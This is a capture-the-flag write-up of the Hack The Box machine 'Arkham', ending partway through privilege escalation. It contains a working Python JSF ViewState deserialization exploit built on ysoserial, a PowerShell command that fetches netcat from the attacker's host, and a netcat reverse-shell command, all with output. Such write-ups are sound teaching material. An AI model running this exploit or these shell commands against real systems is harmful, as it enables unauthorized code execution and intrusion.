@@ -1,0 +1,978 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Arkham - Hack The Box - hackcommander.io</title>
+<meta name="description" content="Arkham was a medium difficulty box that shows how Java deserialization can be used by attackers to get remote code execution. After finding the JSF viewstates encryption key in a LUKS encrypted file partition, I created a Java deserialization payload using ysoserial to upload netcat and get a shell. After getting to user Batman with credentials found in a backup file, I was able to get access to the administrator directory by mounting the local c: drive via SMB instead of doing a proper UAC bypass.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Arkham - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-arkham/">
+
+
+  <meta property="og:description" content="Arkham was a medium difficulty box that shows how Java deserialization can be used by attackers to get remote code execution. After finding the JSF viewstates encryption key in a LUKS encrypted file partition, I created a Java deserialization payload using ysoserial to upload netcat and get a shell. After getting to user Batman with credentials found in a backup file, I was able to get access to the administrator directory by mounting the local c: drive via SMB instead of doing a proper UAC bypass.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-arkham/arkham_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-08-10T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-arkham/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Arkham - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Arkham - Hack The Box">
+    <meta itemprop="description" content="Arkham was a medium difficulty box that shows how Java deserialization can be used by attackers to get remote code execution. After finding the JSF viewstates encryption key in a LUKS encrypted file partition, I created a Java deserialization payload using ysoserial to upload netcat and get a shell. After getting to user Batman with credentials found in a backup file, I was able to get access to the administrator directory by mounting the local c: drive via SMB instead of doing a proper UAC bypass.">
+    <meta itemprop="datePublished" content="August 10, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Arkham - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-08-10T00:00:00+02:00">August 10, 2019 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-arkham/arkham_logo.png" alt="" /></p>
+
+<p>Arkham was a medium difficulty box that shows how Java deserialization can be used by attackers to get remote code execution. After finding the JSF viewstates encryption key in a LUKS encrypted file partition, I created a Java deserialization payload using ysoserial to upload netcat and get a shell. After getting to user Batman with credentials found in a backup file, I was able to get access to the administrator directory by mounting the local c: drive via SMB instead of doing a proper UAC bypass.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>There’s an open SMB share where I find an <code class="language-plaintext highlighter-rouge">appserver.zip</code> file that contains a LUKS encrypted file partition</li>
+  <li>After extracting the LUKS hash from the image file, I am able to crack it with hashcat</li>
+  <li>I then mount the image and find the JSF app configuration files</li>
+  <li>One of the file reveals the MAC secret for the JSF viewstates encryption</li>
+  <li>I contruct an exploit that uses an already existing payload generator for JSF ViewStates and gain RCE</li>
+  <li>I download netcat through powershell using the exploit then execute it to get a reverse shell</li>
+  <li>The user <code class="language-plaintext highlighter-rouge">alfred</code> has a <code class="language-plaintext highlighter-rouge">backup.zip</code> file that contains an image with the <code class="language-plaintext highlighter-rouge">batman</code> user password</li>
+  <li>I can get access as <code class="language-plaintext highlighter-rouge">batman</code> by using WinRM locally but I can’t view the admin’s directory because of UAC</li>
+  <li>The unintended way to solve this one was to mount the local drive and read the system flag, therefore bypassing UAC</li>
+</ul>
+
+<h2 id="blog--tools">Blog / Tools</h2>
+
+<ul>
+  <li><a href="https://articles.forensicfocus.com/2018/02/22/bruteforcing-linux-full-disk-encryption-luks-with-hashcat/">https://articles.forensicfocus.com/2018/02/22/bruteforcing-linux-full-disk-encryption-luks-with-hashcat/</a></li>
+  <li><a href="https://hackernoon.com/cracking-linux-full-disc-encryption-luks-with-hashcat-832d554310">https://hackernoon.com/cracking-linux-full-disc-encryption-luks-with-hashcat-832d554310</a></li>
+  <li><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></li>
+  <li><a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html">https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html</a></li>
+</ul>
+
+<h3 id="nmap">Nmap</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -p- 10.10.10.130
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-16 22:32 EDT
+Nmap scan report for arkham.htb (10.10.10.130)
+Host is up (0.0080s latency).
+Not shown: 65528 filtered ports
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+8080/tcp  open  http          Apache Tomcat 8.5.37
+| http-methods:
+|_  Potentially risky methods: PUT DELETE
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Mask Inc.
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+
+<h3 id="web-enum---iis-on-port-80">Web enum - IIS on port 80</h3>
+
+<p>I just get the standard default IIS web page when I go to port 80.</p>
+
+<p>I didn’t find anything when dirbusting it.</p>
+
+<p><img src="/assets/images/htb-writeup-arkham/port80.png" alt="" /></p>
+
+<h3 id="web-enum---apache-tomcat-on-port-8080">Web enum - Apache Tomcat on port 8080</h3>
+
+<p>The Apache Tomcat page is much more interesting, it’s a company’s front page with a subscription and contact form.</p>
+
+<p><img src="/assets/images/htb-writeup-arkham/port8080.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-arkham/subscribe.png" alt="" /></p>
+
+<p>Most of the links are not functional, but to make sure I didn’t miss anything I spidered the website with Burp:</p>
+
+<p><img src="/assets/images/htb-writeup-arkham/spider.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">userSubscribe.faces</code> file is the <em>Subscribe</em> link on the main page.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">.faces</code> extension is used by JavaServer Faces</p>
+
+<p>According to Wikipedia:</p>
+
+<blockquote>
+  <p>JavaServer Faces (JSF) is a Java specification for building component-based user interfaces for web applications[1] and was formalized as a standard through the Java Community Process being part of the Java Platform, Enterprise Edition. It is also a MVC web framework that simplifies construction of user interfaces (UI) for server-based applications by using reusable UI components in a page.</p>
+</blockquote>
+
+<p>I’ll get back to that after the SMB enumeration, this is the way in.</p>
+
+<h3 id="smb-enumeration">SMB enumeration</h3>
+
+<p>I’ll use <code class="language-plaintext highlighter-rouge">smbmap</code> to quickly scan for accessible shares. I’m using an invalid username here so it connects as guest and not using a null session.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># smbmap -u snowscan -H 10.10.10.130
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.130...
+[+] IP: 10.10.10.130:445	Name: arkham.htb
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	ADMIN$                                            	NO ACCESS
+	BatShare                                          	READ ONLY
+	C$                                                	NO ACCESS
+	IPC$                                              	READ ONLY
+	Users                                             	READ ONLY
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">BatShare</code> is accessible in read-only mode and there is a single file in there.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># smbmap -u snowscan -r BatShare -H 10.10.10.130
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.130...
+[+] IP: 10.10.10.130:445	Name: arkham.htb
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	BatShare                                          	READ ONLY
+	./
+	dr--r--r--                0 Sun Feb  3 08:04:13 2019	.
+	dr--r--r--                0 Sun Feb  3 08:04:13 2019	..
+	fr--r--r--          4046695 Sun Feb  3 08:04:13 2019	appserver.zip
+</code></pre></div></div>
+
+<p>Downloading the file using <code class="language-plaintext highlighter-rouge">smbmap</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># smbmap -u snowscan --download BatShare\\appserver.zip -H 10.10.10.130
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.130...
+[+] Starting download: BatShare\appserver.zip (4046695 bytes)
+[+] File output to: /usr/share/smbmap/10.10.10.130-BatShare_appserver.zip
+</code></pre></div></div>
+
+<p>Extracting and checking the content:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 7z e 10.10.10.130-BatShare_appserver.zip
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-2600K CPU @ 3.40GHz (206A7),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 4046695 bytes (3952 KiB)
+
+Extracting archive: 10.10.10.130-BatShare_appserver.zip
+--
+Path = 10.10.10.130-BatShare_appserver.zip
+Type = zip
+Physical Size = 4046695
+
+Everything is Ok
+
+Files: 2
+Size:       13631637
+Compressed: 4046695
+# ls -l
+total 17268
+-rw-r--r-- 1 root root  4046695 Mar 16 23:24 10.10.10.130-BatShare_appserver.zip
+-rw-r--r-- 1 root root 13631488 Dec 25 01:05 backup.img
+-rw-r--r-- 1 root root      149 Dec 25 01:21 IMPORTANT.txt
+</code></pre></div></div>
+
+<p>I check the <code class="language-plaintext highlighter-rouge">IMPORTANT.txt</code> message first and see that it contains a hint that the <code class="language-plaintext highlighter-rouge">backup.img</code> file is protected.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cat IMPORTANT.txt
+Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce
+</code></pre></div></div>
+
+<p>I then check what kind of file this is and see that it is a LUKS encrypted file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># file backup.img
+backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
+</code></pre></div></div>
+
+<blockquote>
+  <p>The Linux Unified Key Setup (LUKS) is a disk encryption specification created by Clemens Fruhwirth in 2004 and originally intended for Linux.</p>
+</blockquote>
+
+<h3 id="cracking-and-looking-inside-luks-container">Cracking and looking inside LUKS container</h3>
+
+<p>I can extract the beginning of the partition containing the header so I can crack it with hashcat after:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># dd if=backup.img of=backup_header.dd bs=512 count=5000
+5000+0 records in
+5000+0 records out
+2560000 bytes (2.6 MB, 2.4 MiB) copied, 0.0232298 s, 110 MB/s
+</code></pre></div></div>
+
+<p>Now I can crack it with hashcat:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\bin\hashcat&gt;hashcat64 -m 14600 -a 0 -w 3 backup_header.dd passwords\rockyou.txt
+hashcat (v5.1.0) starting...
+
+[...]
+
+backup_header.dd:batmanforever
+</code></pre></div></div>
+
+<p>The password is <code class="language-plaintext highlighter-rouge">batmanforever</code></p>
+
+<p>To mount the image I first open the image file and assign it to the device mapper, then mount it under <code class="language-plaintext highlighter-rouge">/mnt</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cryptsetup luksOpen backup.img backup
+Enter passphrase for backup.img: [batmanforever]
+# mount /dev/mapper/backup /mnt
+
+root@ragingunicorn:/mnt/Mask# ls -lR
+.:
+total 880
+drwxr-xr-x 2 root root   1024 Dec 25 00:22 docs
+-rw-rw-r-- 1 root root  96978 Dec 25 00:18 joker.png
+-rw-rw-r-- 1 root root 105374 Dec 25 00:20 me.jpg
+-rw-rw-r-- 1 root root 687160 Dec 25 00:20 mycar.jpg
+-rw-rw-r-- 1 root root   7586 Dec 25 00:19 robin.jpeg
+drwxr-xr-x 2 root root   1024 Dec 25 00:24 tomcat-stuff
+
+./docs:
+total 196
+-rw-r--r-- 1 root root 199998 Jun 15  2017 Batman-Begins.pdf
+
+./tomcat-stuff:
+total 191
+-rw-r--r-- 1 root root   1368 Dec 25 00:23 context.xml
+-rw-r--r-- 1 root root    832 Dec 25 00:24 faces-config.xml
+-rw-r--r-- 1 root root   1172 Dec 25 00:23 jaspic-providers.xml
+-rw-r--r-- 1 root root     39 Dec 25 00:24 MANIFEST.MF
+-rw-r--r-- 1 root root   7678 Dec 25 00:23 server.xml
+-rw-r--r-- 1 root root   2208 Dec 25 00:23 tomcat-users.xml
+-rw-r--r-- 1 root root 174021 Dec 25 00:23 web.xml
+-rw-r--r-- 1 root root   3498 Dec 25 00:24 web.xml.bak
+</code></pre></div></div>
+
+<p>So I have a bunch of files in there, I’ll concentrate on the xml files.</p>
+
+<p>In the <code class="language-plaintext highlighter-rouge">web.xml.bak</code> file, I find the encryption key for the ViewState. I can use this to construct my own serialized objects and pass them to the server to gain RCE.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+&lt;/context-param&gt;
+    &lt;context-param&gt;
+        &lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;
+        &lt;param-value&gt;HmacSHA1&lt;/param-value&gt;
+     &lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/param-name&gt;
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+&lt;/context-param&gt;
+</code></pre></div></div>
+
+<h3 id="java-server-faces-object-deserialization-exploit">Java Server Faces object deserialization exploit</h3>
+
+<p>I’ll use <code class="language-plaintext highlighter-rouge">ysoserial</code> to generate the payload, then write some python to calculate the hmac based on the key provided in the <code class="language-plaintext highlighter-rouge">web.xml.bak</code> file.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
+<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha1</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">requests</span> <span class="kn">import</span> <span class="n">post</span><span class="p">,</span> <span class="n">get</span>
+
+<span class="kn">import</span> <span class="nn">hmac</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">pyDes</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Java JSF exploit"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Usage: {} &lt;url&gt; &lt;cmd&gt; &lt;secret&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
+
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">secret</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Payload provided: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s">"java -jar ./ysoserial.jar CommonsCollections6 </span><span class="se">\"</span><span class="s">{}</span><span class="se">\"</span><span class="s"> &gt; payload.bin"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Generating the payload with: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Payload was written to payload.bin, reading it into variable..."</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"payload.bin"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Length of payload: {} bytes"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
+
+    <span class="n">key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">secret</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">"base64"</span><span class="p">)</span>
+    <span class="n">des</span> <span class="o">=</span> <span class="n">pyDes</span><span class="p">.</span><span class="n">des</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">pyDes</span><span class="p">.</span><span class="n">ECB</span><span class="p">,</span> <span class="n">padmode</span><span class="o">=</span><span class="n">pyDes</span><span class="p">.</span><span class="n">PAD_PKCS5</span><span class="p">)</span>
+    <span class="n">enc</span> <span class="o">=</span> <span class="n">des</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="n">hmac</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">enc</span><span class="p">),</span> <span class="n">sha1</span><span class="p">).</span><span class="n">digest</span><span class="p">()</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">enc</span> <span class="o">+</span> <span class="n">b</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Sending encoded payload: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"javax.faces.ViewState"</span><span class="p">:</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>To get a reverse shell, I’ll generate a payload that downloads netcat from my machine and store in it c:\programdata. I’m a fan of using netcat whenever possible for these types of challenges so I don’t need to debug Powershell payloads, etc. It’s certainly not stealthy or elegant but it’s good enough for me here.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python boom.py http://10.10.10.130:8080/userSubscribe.faces "powershell -command \\\"Invoke-WebRequest -Uri http://10.10.14.23/nc.exe -outfile \\programdata\\nc.exe\\\"" SnNGOTg3Ni0=
+[*] Payload provided: powershell -command \"Invoke-WebRequest -Uri http://10.10.14.23/nc.exe -outfile \programdata\nc.exe\"
+[*] Generating the payload with: java -jar ./ysoserial.jar CommonsCollections6 "powershell -command \"Invoke-WebRequest -Uri http://10.10.14.23/nc.exe -outfile \programdata\nc.exe\"" &gt; payload.bin
+WARNING: An illegal reflective access operation has occurred
+WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections6 (file:/root/htb/arkham/ysoserial.jar) to field java.util.HashSet.map
+WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections6
+WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
+WARNING: All illegal access operations will be denied in a future release
+[*] Payload was written to payload.bin, reading it into variable...
+[*] Length of payload: 1372 bytes
+[*] Sending encoded payload: EpflyBhnLkAS/cI6nexhMqH/tMmK+e+oOSB+iGGStMf3iTfxuPA5PGNGhz6HO2nAZeudvUiuJvqiPb69whWbK2/EFMRkmhTDywwZ5O1KTeC46zdFOsXfLYOq+MjjY+tkAaxKM5Zb/
+[...]
+[+] Done!
+</code></pre></div></div>
+
+<p>The server retrieves the file from my VM:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.130 - - [17/Mar/2019 00:11:35] "GET /nc.exe HTTP/1.1" 200 -
+</code></pre></div></div>
+
+<p>Then I can execute netcat and get a shell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python boom.py http://10.10.10.130:8080/userSubscribe.faces "\\programdata\\nc.exe -e cmd.exe 10.10.14.23 4444" SnNGOTg3Ni0=
+[*] Payload provided: \programdata\nc.exe -e cmd.exe 10.10.14.23 4444
+[*] Generating the payload with: java -jar ./ysoserial.jar CommonsCollections6 "\programdata\nc.exe -e cmd.exe 10.10.14.23 4444" &gt; payload.bin
+WARNING: An illegal reflective access operation has occurred
+WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections6 (file:/root/htb/arkham/ysoserial.jar) to field java.util.HashSet.map
+WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections6
+WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
+WARNING: All illegal access operations will be denied in a future release
+[*] Payload was written to payload.bin, reading it into variable...
+[*] Length of payload: 1320 bytes
+[*] Sending encoded payload: EpflyBhnLkAS/cI6nexhMqH/tMmK+e+oOSB+iGGStMf3iTfxuPA5PGNGhz6HO2nAZeudvUiuJvqiPb69whWbK2/EFMRkmhTDywwZ5O1KTeC46zdFOsXfLYOq+MjjY+tkAaxKM5Zb/
+[...]
+[+] Done!
+</code></pre></div></div>
+
+<p>I get a shell and found <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.130] 49686
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\tomcat\apache-tomcat-8.5.37\bin&gt;whoami
+arkham\alfred
+
+C:\tomcat\apache-tomcat-8.5.37\bin&gt;type c:\users\alfred\desktop\user.txt
+ba6593...
+</code></pre></div></div>
+
+<h3 id="elevate-to-user-batman">Elevate to user Batman</h3>
+
+<p>Checking local users, I find that batman is a member of local administrators so this is likely the next step.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Alfred&gt;net users
+
+User accounts for \\ARKHAM
+
+-------------------------------------------------------------------------------
+Administrator            Alfred                   Batman
+DefaultAccount           Guest                    WDAGUtilityAccount
+The command completed successfully.
+
+C:\Users\Alfred&gt;net users batman
+[...]
+
+Local Group Memberships      *Administrators       *Remote Management Use
+                             *Users
+Global Group memberships     *None
+The command completed successfully.
+</code></pre></div></div>
+
